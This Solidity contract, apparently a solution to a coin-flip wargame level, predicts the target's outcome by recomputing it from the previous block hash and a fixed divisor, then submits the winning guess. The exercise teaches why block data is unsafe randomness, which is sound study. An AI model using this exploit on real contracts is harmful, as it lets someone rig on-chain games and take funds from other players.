// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    address coinFlipAddress;

    constructor(address coinFlipAddress_) {
        coinFlipAddress = coinFlipAddress_;
    }

    function attack() public {
        ICoinFlip coinFlip = ICoinFlip(coinFlipAddress);
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 flipCoin = blockValue / FACTOR;
        bool side = flipCoin == 1 ? true : false;

        coinFlip.flip(side);
    }
}
